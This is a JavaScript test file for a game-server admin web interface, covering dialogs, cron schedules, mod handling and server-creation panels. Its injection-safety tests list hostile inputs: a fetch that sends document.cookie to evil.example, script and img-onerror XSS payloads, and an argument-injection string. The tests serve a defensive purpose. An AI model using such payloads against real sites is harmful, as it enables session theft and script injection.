// Frontend tests. Run with: node web/testkit/run.js
//
// These cover the two things most likely to break silently: dialogs opened on
// top of other dialogs, and the guarantee that data from the game is never
// treated as markup.

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { document, buildPage } = require('./dom.js');

/* app.js runs in its own vm context, so arrays it creates have that realm's
   Array prototype and assert.deepStrictEqual rejects them against ours. Compare
   list contents rather than identity. */
function assertList(actual, expected, message) {
  assert.strictEqual(Array.from(actual).join(' | '), expected.join(' | '), message);
}

const results = [];
// Tests run one after another, async ones included. Started together, two
// async tests interleave and swap each other's fake fetch mid-flight.
let queue = Promise.resolve();
function test(name, fn) {
  queue = queue.then(async () => {
    try {
      await fn();
      results.push(['pass', name]);
    } catch (err) {
      results.push(['FAIL', name, err.message]);
    }
  });
}

// --- load app.js into a sandbox with the browser globals it expects ---------

const page = buildPage();

const sandbox = {
  document,
  console,
  setTimeout,
  clearTimeout,
  location: { hash: '#/dashboard' },
  fetch: () => Promise.reject(new Error('network disabled in tests')),
  window: null,
  Intl,
  Date,
  Math,
  JSON,
  Object,
  Array,
  String,
  Number,
  Set,
  Map,
  Promise,
  Error,
  encodeURIComponent,
  isNaN,
  parseInt,
  parseFloat,
};
sandbox.window = sandbox;
sandbox.globalThis = sandbox;
sandbox.window.addEventListener = () => {};
sandbox.EventSource = class {
  constructor() { this.listeners = {}; }
  addEventListener(type, fn) { (this.listeners[type] = this.listeners[type] || []).push(fn); }
  close() {}
};

// Top-level const/let in a script do not become globals, so the harness asks
// app.js to hand out the bindings it wants to exercise. boot() is dropped
// because it would immediately try to reach the API.
const source = fs.readFileSync(path.join(__dirname, '..', 'app.js'), 'utf8')
  .replace(/\nboot\(\);\s*$/, '\n') +
  '\nglobalThis.__exports__ = { el, openModal, closeModal, closeAllModals, ' +
  'confirmDialog, modals, feedItem, boardRow, fmtBytes, fmtDuration, ' +
  'hasTime, fmtClock, fmtDateTime, fmtAgo, statusLabel, prettyKey, ' +
  'buildCron, readCron, describeCronLocally, summariseSteps, describeStep, ' +
  'bundlePrimary, buildPickerTree, S, ' +
  'renderModIssues, confirmModChange, modIssueTone, ' +
  'stackStatusPanel, stackServersPanel, stackCreatePanel, paintPlan, buildControl, StackState, ' +
  'newWizard, applyWizardMods, settingsEditor, wizardRequest, ' +
  'commandAvailability, isStopped, powerButton, editWebhook, viewDiscord, editServerChannel, ' +
  'apiKeyCreateDialog, apiKeysBody, modRequestsPanel, renderGate, renderSetup, showImportResult };\n';

vm.createContext(sandbox);
vm.runInContext(source, sandbox, { filename: 'app.js' });

const {
  el, openModal, closeModal, closeAllModals, confirmDialog, modals, feedItem, boardRow,
  fmtBytes, fmtDuration, hasTime, fmtClock, fmtDateTime, fmtAgo, statusLabel, prettyKey,
  buildCron, readCron, describeCronLocally, summariseSteps, describeStep,
  bundlePrimary, buildPickerTree, S,
  renderModIssues, confirmModChange, modIssueTone,
  stackStatusPanel, stackServersPanel, stackCreatePanel, paintPlan, buildControl, StackState,
  newWizard, applyWizardMods, settingsEditor, wizardRequest,
  commandAvailability, isStopped, powerButton, editWebhook, viewDiscord, editServerChannel,
  apiKeyCreateDialog, apiKeysBody, modRequestsPanel, renderGate, renderSetup, showImportResult,
} = sandbox.__exports__;

// The views read from S, so give it the shape a loaded page would have.
S.state = { servers: [], status: [], events: [], players: [], schedules: [] };
S.authenticated = true;

const overlay = () => document.querySelector('#overlay');
const openCount = () => modals.length;
const visibleModals = () =>
  overlay().children.filter((c) => c.nodeType === 1 && !c.classList.contains('hidden')).length;

// --- modal stack ------------------------------------------------------------

test('a single modal opens and closes', () => {
  closeAllModals();
  openModal({ title: 'One', body: el('p', { text: 'hello' }) });
  assert.strictEqual(openCount(), 1);
  assert.ok(!overlay().classList.contains('hidden'), 'overlay should be visible');
  closeModal();
  assert.strictEqual(openCount(), 0);
  assert.ok(overlay().classList.contains('hidden'), 'overlay should hide when the last modal closes');
});

// This is the bug Rick hit: the folder picker opens from inside the server
// editor, and closing it used to drop the editor as well.
test('a modal opened on top of another leaves the parent intact', () => {
  closeAllModals();
  const parent = openModal({ title: 'Add a server', body: el('input', { id: 'server-name' }) });
  parent.querySelector('#server-name').value = 'Riverside';

  openModal({ title: 'Choose the server folder', body: el('p', { text: 'browser' }) });
  assert.strictEqual(openCount(), 2, 'both dialogs should be on the stack');
  assert.strictEqual(visibleModals(), 1, 'only the top dialog is visible');

  closeModal();
  assert.strictEqual(openCount(), 1, 'closing the picker must leave the editor open');
  assert.ok(!overlay().classList.contains('hidden'), 'the overlay must stay up');
  assert.strictEqual(
    parent.querySelector('#server-name').value, 'Riverside',
    'the editor must keep what was typed into it');

  closeModal();
  assert.strictEqual(openCount(), 0);
});

test('three deep stacks and unwinds in order', () => {
  closeAllModals();
  openModal({ title: 'A', body: el('p') });
  openModal({ title: 'B', body: el('p') });
  openModal({ title: 'C', body: el('p') });
  assert.strictEqual(visibleModals(), 1);
  closeModal();
  assert.strictEqual(openCount(), 2);
  assert.strictEqual(visibleModals(), 1);
  closeAllModals();
  assert.strictEqual(openCount(), 0);
  assert.strictEqual(overlay().children.length, 0, 'the overlay should be emptied');
});

test('a backdrop click closes only the top dialog', () => {
  closeAllModals();
  openModal({ title: 'Editor', body: el('p') });
  openModal({ title: 'Picker', body: el('p') });
  overlay().dispatch('mousedown', { target: overlay() });
  assert.strictEqual(openCount(), 1, 'the parent must survive a backdrop click on the child');
  closeAllModals();
});

test('a click inside the dialog does not close it', () => {
  closeAllModals();
  const modal = openModal({ title: 'Editor', body: el('p') });
  overlay().dispatch('mousedown', { target: modal });
  assert.strictEqual(openCount(), 1);
  closeAllModals();
});

test('escape closes one dialog at a time', () => {
  closeAllModals();
  openModal({ title: 'A', body: el('p') });
  openModal({ title: 'B', body: el('p') });
  document.dispatch('keydown', { key: 'Escape', stopPropagation() {} });
  assert.strictEqual(openCount(), 1);
  document.dispatch('keydown', { key: 'Escape', stopPropagation() {} });
  assert.strictEqual(openCount(), 0);
});

// --- confirmation dialogs ---------------------------------------------------

test('confirm resolves true when confirmed and leaves no modal behind', async () => {
  closeAllModals();
  const promise = confirmDialog({ title: 'Restart?', message: 'Sure?', confirmLabel: 'Restart' });
  const buttons = overlay().querySelectorAll('button');
  const confirm = buttons.find((b) => b.textContent === 'Restart');
  assert.ok(confirm, 'the confirm button should be labelled with the action');
  confirm.dispatch('click');
  // Sample the stack now: awaiting would let a later test open its own dialog.
  const remaining = openCount();
  assert.strictEqual(await promise, true);
  assert.strictEqual(remaining, 0, 'confirming should leave nothing open');
});

test('confirm resolves false when dismissed by the backdrop', async () => {
  closeAllModals();
  const promise = confirmDialog({ title: 'Delete?', message: 'Sure?' });
  overlay().dispatch('mousedown', { target: overlay() });
  const remaining = openCount();
  assert.strictEqual(await promise, false, 'a dismissed confirmation must mean no');
  assert.strictEqual(remaining, 0, 'dismissing should leave nothing open');
});

test('confirm resolves false on escape', async () => {
  closeAllModals();
  const promise = confirmDialog({ title: 'Delete?', message: 'Sure?' });
  document.dispatch('keydown', { key: 'Escape', stopPropagation() {} });
  assert.strictEqual(await promise, false);
});

test('a cancelled confirmation returns to the dialog underneath', async () => {
  closeAllModals();
  const editor = openModal({ title: 'Edit riv.ini', body: el('textarea', { id: 'editor' }) });
  editor.querySelector('#editor').value = 'MaxPlayers=32';

  const promise = confirmDialog({ title: 'Save?', message: 'Write to disk?' });
  const cancel = overlay().querySelectorAll('button').find((b) => b.textContent === 'Cancel');
  cancel.dispatch('click');

  // Sampled synchronously, before the await yields to any later test.
  const remaining = openCount();
  const preserved = editor.querySelector('#editor').value;
  closeAllModals();

  assert.strictEqual(await promise, false);
  assert.strictEqual(remaining, 1, 'the editor must still be open');
  assert.strictEqual(preserved, 'MaxPlayers=32',
    'unsaved edits must survive a cancelled confirmation');
});

test('a typed confirmation stays disabled until the phrase matches', () => {
  closeAllModals();
  confirmDialog({ title: 'Restore?', message: 'Overwrite the world?', requireText: 'Riverside' });
  const confirm = overlay().querySelectorAll('button').find((b) => b.textContent === 'Confirm');
  const input = overlay().querySelector('input');
  assert.strictEqual(confirm.disabled, true, 'starts disabled');

  input.value = 'Riversi';
  input.dispatch('input');
  assert.strictEqual(confirm.disabled, true, 'a partial match must not enable it');

  input.value = 'Riverside';
  input.dispatch('input');
  assert.strictEqual(confirm.disabled, false, 'an exact match enables it');
  closeAllModals();
});

// --- injection safety -------------------------------------------------------

// The vulnerability in version 7 was a player name reaching an inline handler.
// These assert that hostile input lands as literal text and nowhere else.
const HOSTILE = [
  `';fetch('//evil.example?c='+document.cookie)//`,
  `<img src=x onerror=alert(1)>`,
  `"><script>alert(1)</script>`,
  `Rick" -r "pwned`,
];

test('hostile strings render as text, never as structure', () => {
  for (const name of HOSTILE) {
    const node = el('span', { text: name });
    assert.strictEqual(node.textContent, name, 'the name should round-trip exactly');
    assert.strictEqual(node.children.filter((c) => c.nodeType === 1).length, 0,
      'no element children should be created from a string');
  }
});

test('el() never sets an inline event handler from data', () => {
  const node = el('button', { text: `<img src=x onerror=alert(1)>` });
  const attrs = Object.keys(node.attributes);
  assert.ok(!attrs.some((a) => a.toLowerCase().startsWith('on')),
    'no on* attribute should exist: ' + attrs.join(','));
});

test('an event feed item keeps a hostile message as text', () => {
  const node = feedItem({
    at: new Date().toISOString(),
    severity: 'warn',
    message: HOSTILE[1],
    detail: HOSTILE[0],
    server: 'Riverside',
    actor: 'rick',
  });
  assert.ok(node.textContent.includes(HOSTILE[1]), 'the message text should be present verbatim');
  const scripts = node.querySelectorAll('script').length + node.querySelectorAll('img').length;
  assert.strictEqual(scripts, 0, 'no elements should be conjured from the message');
});

test('a board row built from a hostile server name stays inert', () => {
  const server = {
    id: 'x', name: HOSTILE[2], enabled: true, host: '127.0.0.1', rconPort: 27015,
    dockerContainer: '',
  };
  const status = { serverId: 'x', online: true, playerCount: 1, players: [HOSTILE[0]] };
  const row = boardRow(server, status);
  assert.strictEqual(row.querySelectorAll('script').length, 0);
  assert.ok(row.textContent.includes(HOSTILE[2]), 'the name should display literally');
});

// --- timestamps -------------------------------------------------------------

// A zero time.Time serialises to "0001-01-01T00:00:00Z", which is a truthy
// string in JavaScript. Testing a timestamp for truthiness is what made a
// brand new server display a pending restart banner.
const ZERO_TIME = '0001-01-01T00:00:00Z';

test('setting labels read as English without hiding the real key', () => {
  assert.strictEqual(prettyKey('PublicName'), 'Public name');
  assert.strictEqual(prettyKey('MaxPlayers'), 'Max players');
  assert.strictEqual(prettyKey('ZombieLore.Speed'), 'Speed');
  assert.strictEqual(prettyKey('PVP'), 'PVP');
});

test('statusLabel covers every state', () => {
  const enabled = { enabled: true };
  assert.strictEqual(statusLabel({ enabled: false }, {}), 'Paused');
  assert.strictEqual(statusLabel(enabled, { online: true }), 'Online');
  assert.strictEqual(statusLabel(enabled, { online: false }), 'Offline');
  assert.strictEqual(statusLabel(enabled, { restarting: true }), 'Restarting');
  assert.strictEqual(statusLabel(enabled, { restarting: true, restartReason: 'stopping' }), 'Stopping');
});

test('hasTime rejects the year-one placeholder', () => {
  assert.strictEqual(hasTime(ZERO_TIME), false, 'year one is not a real timestamp');
  assert.strictEqual(hasTime(null), false);
  assert.strictEqual(hasTime(undefined), false);
  assert.strictEqual(hasTime(''), false);
  assert.strictEqual(hasTime('not a date'), false);
  assert.strictEqual(hasTime(new Date().toISOString()), true);
});

test('formatters treat the placeholder as absent', () => {
  assert.strictEqual(fmtClock(ZERO_TIME), '—');
  assert.strictEqual(fmtDateTime(ZERO_TIME), '—');
  assert.strictEqual(fmtAgo(ZERO_TIME), 'never');
});

test('a freshly added server shows no pending restart banner', () => {
  const server = { id: 'x', name: 'Riverside', enabled: true, host: '127.0.0.1', rconPort: 27015, dockerContainer: '' };
  // Exactly what the old wire format sent for a server that had never run.
  const status = {
    serverId: 'x', online: false, playerCount: 0, players: [],
    pendingRestartAt: ZERO_TIME, pendingReason: '',
    lastCheck: ZERO_TIME, lastBackup: ZERO_TIME, lastOnline: ZERO_TIME,
    modsMissing: [],
  };
  const text = boardRow(server, status).textContent;
  assert.ok(!text.includes('Automatic restart'),
    'a server that has never run must not claim a restart is scheduled: ' + text);
  assert.ok(text.includes('never checked'),
    'an unprobed server should say so rather than "checked never": ' + text);
});

test('a genuine pending restart still shows', () => {
  const server = { id: 'x', name: 'Riverside', enabled: true, host: '127.0.0.1', rconPort: 27015, dockerContainer: '' };
  const soon = new Date(Date.now() + 10 * 60 * 1000).toISOString();
  const status = {
    serverId: 'x', online: true, playerCount: 2, players: ['Rick'],
    pendingRestartAt: soon, pendingReason: 'mod update',
    lastCheck: new Date().toISOString(), modsMissing: [],
  };
  const text = boardRow(server, status).textContent;
  assert.ok(text.includes('Automatic restart'), 'a real pending restart must be announced');
  assert.ok(text.includes('mod update'), 'and should say why');
});

// --- restarting state -------------------------------------------------------

test('a restarting server reads as restarting, not offline', () => {
  const server = { id: 'x', name: 'Riverside', enabled: true, host: '127.0.0.1', rconPort: 27015, dockerContainer: 'pz' };
  const status = {
    serverId: 'x', online: false, playerCount: 0, players: [],
    restarting: true, restartReason: 'requested by rick',
    restartingSince: new Date(Date.now() - 30000).toISOString(),
    lastCheck: new Date().toISOString(), modsMissing: [],
    error: 'Nothing is listening on 127.0.0.1:27015.',
  };
  const row = boardRow(server, status);
  const text = row.textContent;

  assert.ok(text.includes('Restarting'), 'the state should say Restarting: ' + text);
  assert.ok(!text.includes('Offline'), 'it must not also claim to be offline: ' + text);
  assert.ok(row.classList.contains('restarting'), 'the row needs the restarting class for its colour');
  assert.ok(!text.includes('Nothing is listening'),
    'the connection error is expected during a restart and should not be shown as a fault');
});

test('a genuinely offline server still reads as offline', () => {
  const server = { id: 'x', name: 'Riverside', enabled: true, host: '127.0.0.1', rconPort: 27015, dockerContainer: '' };
  const status = {
    serverId: 'x', online: false, restarting: false, players: [], playerCount: 0,
    lastCheck: new Date().toISOString(), error: 'Nothing is listening on 127.0.0.1:27015.',
    modsMissing: [],
  };
  const row = boardRow(server, status);
  assert.ok(row.classList.contains('offline'));
  assert.ok(row.textContent.includes('Offline'));
  assert.ok(row.textContent.includes('Nothing is listening'), 'a real outage should show the reason');
});

test('the restart button is disabled while a restart is running', () => {
  const server = { id: 'x', name: 'Riverside', enabled: true, host: '127.0.0.1', rconPort: 27015, dockerContainer: 'pz' };
  const busy = boardRow(server, { serverId: 'x', online: false, restarting: true, players: [], modsMissing: [] });
  const button = busy.querySelectorAll('button').find((b) => b.textContent.startsWith('Restarting'));
  assert.ok(button, 'the restart button should show progress');
  assert.strictEqual(button.disabled, true, 'and refuse a second press');

  const idle = boardRow(server, { serverId: 'x', online: true, restarting: false, players: [], modsMissing: [] });
  const restart = idle.querySelectorAll('button').find((b) => b.textContent === 'Restart');
  assert.strictEqual(restart.disabled, false);
});

// --- schedule timing --------------------------------------------------------

// The plain-English picker compiles to cron, and an existing expression is read
// back into the same form, so editing a job never dumps you into cron syntax.
test('timing round trips through cron', () => {
  const cases = [
    ['minutes', { every: 15 }, '*/15 * * * *'],
    ['hours', { every: 6, minute: 30 }, '30 */6 * * *'],
    ['daily', { hour: 4, minute: 0 }, '0 4 * * *'],
    ['weekly', { hour: 5, minute: 30, weekday: '1' }, '30 5 * * 1'],
    ['monthly', { hour: 3, minute: 0, day: 1 }, '0 3 1 * *'],
  ];
  for (const [mode, values, expected] of cases) {
    const built = buildCron(mode, values);
    assert.strictEqual(built, expected, mode + ' should build ' + expected);
    const read = readCron(built);
    assert.strictEqual(read.mode, mode, built + ' should read back as ' + mode);
    for (const key of Object.keys(values)) {
      assert.strictEqual(String(read[key]), String(values[key]),
        mode + ': ' + key + ' should survive the round trip');
    }
  }
});

test('an expression the simple forms cannot express falls back to advanced', () => {
  for (const expr of ['10-30/7 * * * *', '0 4 1 6 *', '0 0 13 * fri', 'nonsense']) {
    assert.strictEqual(readCron(expr).mode, 'advanced', expr + ' should open as advanced');
  }
});

test('the schedule preview reads as English', () => {
  assert.strictEqual(describeCronLocally('*/15 * * * *'), 'every 15 minutes');
  assert.strictEqual(describeCronLocally('0 4 * * *'), 'every day at 04:00');
  assert.strictEqual(describeCronLocally('30 5 * * 1'), 'every Monday at 05:30');
  assert.strictEqual(describeCronLocally('0 3 1 * *'), 'on day 1 of each month at 03:00');
  assert.strictEqual(describeCronLocally('30 */6 * * *'), 'every 6 hours, at 30 past');
});

// --- schedule steps ---------------------------------------------------------

test('a multi-step job summarises as a readable sequence', () => {
  S.commands = [{ id: 'additem', label: 'Give an item', group: 'Items', params: [] }];
  const steps = [
    { kind: 'broadcast', message: 'Restarting in 1 minute' },
    { kind: 'wait', seconds: 60 },
    { kind: 'save' },
    { kind: 'restart' },
  ];
  const summary = summariseSteps(steps);
  assert.ok(summary.includes('→'), 'steps should read as a sequence: ' + summary);
  assert.ok(summary.startsWith('say "Restarting'), summary);
  assert.ok(summary.includes('wait 1m'), summary);
  assert.ok(summary.endsWith('restart'), summary);
});

test('a targeted action step says who it applies to', () => {
  S.commands = [{ id: 'additem', label: 'Give an item', group: 'Items', params: [] }];
  assert.strictEqual(
    describeStep({ kind: 'action', action: 'additem', args: ['@each', 'Base.Axe', '1'] }),
    'give an item for everyone');
  assert.strictEqual(
    describeStep({ kind: 'action', action: 'additem', args: ['@random', 'Base.Axe', '1'] }),
    'give an item for a random player');
  assert.strictEqual(
    describeStep({ kind: 'action', action: 'additem', args: ['Rick', 'Base.Axe', '1'] }),
    'give an item');
});

test('an empty job is described rather than shown blank', () => {
  assert.strictEqual(summariseSteps([]), 'no steps');
  assert.strictEqual(summariseSteps(null), 'no steps');
});

// --- mod bundles ------------------------------------------------------------

test('a multi-mod download is named after the mod the others need', () => {
  const meta = {
    Tsarslib: { id: 'Tsarslib', name: "Tsar's Common Library" },
    TrueActionsDancing: { id: 'TrueActionsDancing', require: ['Tsarslib'] },
    TrueActionsExtra: { id: 'TrueActionsExtra', require: ['Tsarslib'] },
  };
  const bundle = { workshopId: '2392709985', mods: ['TrueActionsDancing', 'TrueActionsExtra', 'Tsarslib'] };
  assert.strictEqual(bundlePrimary(bundle, meta), "Tsar's Common Library",
    'the dependency the others require should name the download');
});

test('with no dependency declared it falls back to the shortest ID', () => {
  const meta = { AAA: { id: 'AAA' }, BB: { id: 'BB' } };
  assert.strictEqual(bundlePrimary({ workshopId: '1', mods: ['AAA', 'BB'] }, meta), 'BB');
});

test('an empty bundle still names itself', () => {
  assert.strictEqual(bundlePrimary({ workshopId: '99', mods: [] }, {}), 'Workshop 99');
});

// --- picker tree ------------------------------------------------------------

test('vanilla categories sit at the top, mods in their own folders', () => {
  const entries = [
    { id: 'Base.Axe', name: 'Axe', category: 'Tool', source: 'vanilla' },
    { id: 'Base.Bread', name: 'Bread', category: 'Food', source: 'vanilla' },
    { id: 'VanillaExpanded.Musket', name: 'Musket', category: 'Weapon', source: 'VanillaExpanded' },
    { id: 'VanillaExpanded.Sabre', name: 'Sabre', category: 'Weapon', source: 'VanillaExpanded' },
    { id: 'OtherMod.Relic', name: 'Relic', category: 'Tool', source: 'OtherMod' },
  ];
  const tree = buildPickerTree(entries);
  const labels = tree.nodes.map((n) => n.label);

  assertList(labels, ['Everything', 'Food', 'Tool', 'Mods'],
    'vanilla categories are top level and mods are collected');

  const modsNode = tree.nodes.find((n) => n.label === 'Mods');
  assert.ok(modsNode.children, 'Mods should be a folder');
  assertList(modsNode.children.map((c) => c.label), ['OtherMod', 'VanillaExpanded'],
    'one folder per mod, sorted');
  assert.strictEqual(modsNode.count, 3, 'the Mods folder counts everything inside it');

  // A vanilla category must not pick up modded items sharing its name.
  assert.strictEqual(tree.entriesFor('v:Tool').length, 1, 'Tool is vanilla only');
  assert.strictEqual(tree.entriesFor('m:VanillaExpanded').length, 2);
  assert.strictEqual(tree.entriesFor('all').length, 5);
  assert.strictEqual(tree.entriesFor('nonexistent').length, 0);
});

test('with no mods installed there is no Mods folder', () => {
  const tree = buildPickerTree([{ id: 'Base.Axe', category: 'Tool', source: 'vanilla' }]);
  assert.ok(!tree.nodes.some((n) => n.label === 'Mods'));
});

test('an item with no category is still reachable', () => {
  const tree = buildPickerTree([{ id: 'Base.Thing', source: 'vanilla' }]);
  assert.ok(tree.nodes.some((n) => n.label === 'Uncategorised'));
  assert.strictEqual(tree.entriesFor('v:Uncategorised').length, 1);
});


// --- mod pre-flight ---------------------------------------------------------

const sampleIssues = [
  { level: 'block', code: 'dependency-missing', mod: 'Bandits',
    message: 'Bandits requires damnlib, which will not be in the mod list.' },
  { level: 'warn', code: 'workshop-orphan', mod: 'Ladders',
    message: 'Workshop item 3629835761 is still listed but nothing from it is enabled.' },
  { level: 'info', code: 'files-remain',
    message: 'The files for Ladders stay on disk.',
    paths: ['/pzroot/a/mods/Ladders', '/pzroot/b/mods/Ladders'] },
];

test('findings are grouped by how bad they are', () => {
  const node = renderModIssues(sampleIssues);
  const headings = node.querySelectorAll('h4').map((h) => h.textContent);
  assertList(headings, ['This will break something', 'Worth checking', 'For information'],
    'each severity should get its own heading, worst first');
});

test('an empty finding list renders nothing at all', () => {
  assert.strictEqual(renderModIssues([]), null);
  assert.strictEqual(renderModIssues(null), null);
});

test('severity is carried on the list item so it can be styled', () => {
  assert.strictEqual(modIssueTone('block'), 'bad');
  assert.strictEqual(modIssueTone('warn'), 'warn');
  assert.strictEqual(modIssueTone('info'), 'info');
  const node = renderModIssues(sampleIssues);
  const items = node.querySelectorAll('li');
  assertList(items.map((li) => li.className), ['bad', 'warn', 'info']);
});

test('paths that need dealing with by hand are shown', () => {
  const node = renderModIssues(sampleIssues);
  const codes = node.querySelectorAll('.issue-paths code').map((c) => c.textContent);
  assertList(codes, ['/pzroot/a/mods/Ladders', '/pzroot/b/mods/Ladders']);
});

/* A mod ID is player-supplied text that came off the disk. It must never be
   able to become markup, in a dialog or anywhere else. */
test('a hostile mod name in a finding is text, never markup', () => {
  const node = renderModIssues([{ level: 'warn', code: 'x',
    message: '<img src=x onerror=alert(1)> broke something' }]);
  assert.strictEqual(node.querySelectorAll('img').length, 0,
    'no element should have been created from the message');
  assert.ok(node.textContent.includes('<img src=x'), 'it should read as literal text');
});

test('a clean mod list confirms with a plain Save', async () => {
  closeAllModals();
  const answer = confirmModChange('servertest.ini', []);
  const foot = overlay().querySelector('.modal-foot');
  const labels = foot.children.map((b) => b.textContent);
  assertList(labels, ['Cancel', 'Save']);
  assert.strictEqual(foot.children[1].disabled, false,
    'with nothing wrong, saving should not be gated');
  foot.children[1].click();
  assert.strictEqual(await answer, true);
  assert.strictEqual(openCount(), 0);
});

/* The whole point of a blocking finding is that clicking through it and
   reading it should not feel the same. */
test('a breaking mod list gates the save behind a tick', async () => {
  closeAllModals();
  const answer = confirmModChange('servertest.ini', sampleIssues);
  const foot = overlay().querySelector('.modal-foot');
  const proceed = foot.children[1];
  assert.strictEqual(proceed.textContent, 'Save anyway');
  assert.strictEqual(proceed.disabled, true, 'it must start disabled');

  const box = overlay().querySelector('.check input');
  box.checked = true;
  box.dispatchEvent({ type: 'change', target: box });
  assert.strictEqual(proceed.disabled, false, 'ticking the box should release it');

  proceed.click();
  assert.strictEqual(await answer, true);
});

test('dismissing the pre-flight means no', async () => {
  closeAllModals();
  const answer = confirmModChange('servertest.ini', sampleIssues);
  closeAllModals();
  assert.strictEqual(await answer, false);
});

// --- stack screen -----------------------------------------------------------

test('Arcane status says what works without it', () => {
  const down = stackStatusPanel({ root: '/home/rick/docker/pzserver', dataRoot: '/srv/zomboid',
    arcane: { configured: true, available: false, message: 'Arcane is unavailable: connection refused.' } });
  assert.ok(down.textContent.includes('Unavailable'));
  assert.ok(down.textContent.includes('connection refused'));
  assert.ok(down.textContent.includes('Restarts save and quit over RCON'),
    'the one thing that still works must be stated');
  const up = stackStatusPanel({ arcane: { configured: true, available: true, environment: '0' } });
  assert.ok(up.textContent.includes('Connected') && up.textContent.includes('environment 0'));
});

const readyStack = {
  name: 'pz-muldraugh', dir: '/home/rick/docker/pzserver/pz-muldraugh', container: 'pz-muldraugh',
  serverName: 'muldraugh', gamePort: 16269, udpPort: 16270, rconPort: 27019, restart: 'unless-stopped',
  stopGrace: '120s', image: 'x/y@sha256:abc', imagePinned: true, installed: true, configured: true,
  serverId: 'pz-muldraugh', ready: true,
  mounts: [{ source: '/srv/zomboid/muldraugh/projectzomboid/data', target: '/project-zomboid', ok: true }],
};

test('a ready stack shows its facts and its actions', () => {
  const node = stackServersPanel({ stacks: [readyStack] });
  assert.ok(node.textContent.includes('Ready'));
  assert.ok(node.textContent.includes('RCON 27019') && node.textContent.includes('game 16269/16270'));
  const labels = node.querySelectorAll('.stack-row-actions button').map((b) => b.textContent);
  assertList(labels, ['Open', 'Environment', 'Deploy', 'Command']);
  const deploy = node.querySelectorAll('.stack-row-actions button').find((b) => b.textContent === 'Deploy');
  assert.ok(!deploy.disabled);
});

test('a stack with problems cannot be deployed from its row', () => {
  const node = stackServersPanel({ stacks: [Object.assign({}, readyStack, {
    ready: false, problems: ['/project-zomboid: /srv/zomboid/x is empty.'] })] });
  const deploy = node.querySelectorAll('.stack-row-actions button').find((b) => b.textContent === 'Deploy');
  assert.ok(deploy.disabled, 'Compose would mount the empty folder');
});

test('problems and warnings are shown on the row, not hidden', () => {
  const node = stackServersPanel({ stacks: [Object.assign({}, readyStack, {
    ready: false, imagePinned: false,
    problems: ['/project-zomboid: /srv/zomboid/x is empty.'],
    warnings: ['stop_grace_period is "30s".'],
  })] });
  assert.ok(node.textContent.includes('Will not start'));
  assert.ok(node.textContent.includes('Image not pinned'));
  assert.ok(node.textContent.includes('is empty'));
  assert.ok(node.textContent.includes('stop_grace_period'));
});

test('a stack that never became a server has no actions', () => {
  const node = stackServersPanel({ stacks: [{ name: 'broken', problems: ['Cannot read docker-compose.yml'] }] });
  assert.strictEqual(node.querySelectorAll('.stack-row-actions').length, 0);
});

test('an empty stacks folder explains the layout', () => {
  const node = stackServersPanel({ root: '/home/rick/docker/pzserver', stacks: [] });
  assert.ok(node.textContent.includes('/home/rick/docker/pzserver'));
  assert.ok(node.textContent.includes('compose file'));
});

test('creating is refused in the interface without a pinned image', () => {
  const node = stackCreatePanel({ image: '', imagePinned: false, sources: [] });
  assert.ok(node.textContent.includes('PZADMIN_GAME_IMAGE is not set'));
  assert.strictEqual(node.querySelectorAll('button').length, 0);
});

test('a create plan shows every file, the folders and the command', () => {
  const host = el('div');
  paintPlan(host, {
    name: 'pz-new', gamePort: 16273, udpPort: 16274, rconPort: 27021,
    stackDir: '/home/rick/docker/pzserver/pz-new', startedFrom: 'defaults', changedIni: 2, changedSandbox: 1,
    compose: 'services:\n  pz-new:\n    image: x@sha256:abc\n',
    env: 'RCON_PASSWORD=(hidden)\n',
    serverFiles: { 'new.ini': 'PVP=false\n', 'new_SandboxVars.lua': 'SandboxVars = {\n}\n' },
    creates: ['/srv/zomboid/new/projectzomboid/data'],
    reuses: ['/srv/zomboid/old/projectzomboid/config'],
    warnings: ['/srv/zomboid/old/projectzomboid/config already has files in it.'],
    command: 'cd /home/rick/docker/pzserver/pz-new && docker compose up -d',
  });
  const summaries = host.querySelectorAll('summary').map((s) => s.textContent);
  assertList(summaries, ['docker-compose.yml', '.env', 'Server/new.ini', 'Server/new_SandboxVars.lua']);
  assert.ok(host.textContent.includes('the game defaults, with 2 server and 1 world'));
  assert.ok(host.textContent.includes('Creates /srv/zomboid/new'));
  assert.ok(host.textContent.includes('Reuses /srv/zomboid/old'));
  assert.ok(host.textContent.includes('already has files'), 'warnings must be visible before creating');
  assert.ok(host.textContent.includes('docker compose up -d'));
});

test('the create panel opens a wizard rather than a form', () => {
  const node = stackCreatePanel({ image: 'x@sha256:abc', imagePinned: true, sources: [] });
  const labels = node.querySelectorAll('button').map((b) => b.textContent);
  assertList(labels, ['New server\u2026']);
});

test('a choice with labels from the game shows the labels', () => {
  const c = buildControl({ key: 'Zombies', type: 'choice', value: '4',
    options: [{ value: '1', label: 'Insane' }, { value: '4', label: 'Normal' }] }, () => {});
  const texts = c.node.querySelectorAll('option').map((o) => o.textContent);
  assertList(texts, ['Insane', 'Normal']);
});

test('the settings editor records only what changed', () => {
  const changes = {};
  const node = settingsEditor([
    { key: 'PVP', type: 'bool', value: 'true', group: 'Gameplay' },
    { key: 'PublicName', type: 'text', value: 'My PZ Server', group: 'Identity' },
  ], changes, { essentials: ['PublicName'] });
  assert.ok(node.textContent.includes('Most people change these'));
  assert.ok(node.textContent.includes('2 settings'));
});

test('mods become Mods, WorkshopItems and Map lines after what was already there', () => {
  const W = newWizard({ dataRoot: '/srv/zomboid' });
  W.fields = { ini: [
    { key: 'Mods', value: 'KeepMe' }, { key: 'WorkshopItems', value: '100' }, { key: 'Map', value: 'Muldraugh, KY' },
  ] };
  W.mods = [
    { workshopId: '200', title: 'A', modIds: ['ModA'], mapFolders: [] },
    { workshopId: '300', title: 'Map', modIds: ['MapMod'], mapFolders: ['Coalfield'] },
  ];
  applyWizardMods(W);
  assert.strictEqual(W.ini.Mods, 'KeepMe;ModA;MapMod');
  assert.strictEqual(W.ini.WorkshopItems, '100;200;300');
  assert.strictEqual(W.ini.Map, 'Coalfield;Muldraugh, KY', 'custom maps load before the base map');

  W.mods = [{ workshopId: '400', title: 'No ID', modIds: [], mapFolders: [] }];
  assert.throws(() => applyWizardMods(W), /Mod ID/);
});

test('the wizard request carries the chosen admin password and the changes', () => {
  const W = newWizard({ dataRoot: '/srv/zomboid' });
  W.basics.name = 'pz-x';
  W.basics.adminPassword = 'hunter2';
  W.ini = { PVP: 'false' };
  const req = wizardRequest(W);
  assert.strictEqual(req.adminPassword, 'hunter2');
  assert.strictEqual(req.start, 'defaults');
  assert.strictEqual(req.ini.PVP, 'false');
});

